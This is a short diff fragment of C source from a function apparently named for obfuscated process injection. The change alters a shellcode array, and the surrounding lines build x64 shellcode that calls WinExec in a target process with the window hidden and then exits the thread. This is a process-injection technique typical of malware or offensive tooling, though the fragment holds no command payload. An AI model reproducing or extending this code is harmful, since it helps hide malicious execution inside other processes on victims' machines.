@@ -513,7 +513,7 @@ void obf_sys_inject_process(void) {
     DWORD_PTR targetWinExec = targetKernel32Base + winExecOffset;
     
     /* Build shellcode: mov rdx, 0; mov rax, WinExec; call rax; xor ecx, ecx; mov rax, ExitThread; jmp rax */
-    unsigned char shellcode[32] = {
+    unsigned char shellcode[] = {
         0x48, 0xC7, 0xC2, 0x00, 0x00, 0x00, 0x00,  // mov rdx, 0 (uCmdShow = SW_HIDE)
         0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, WinExec
         0xFF, 0xD0,                                  // call rax
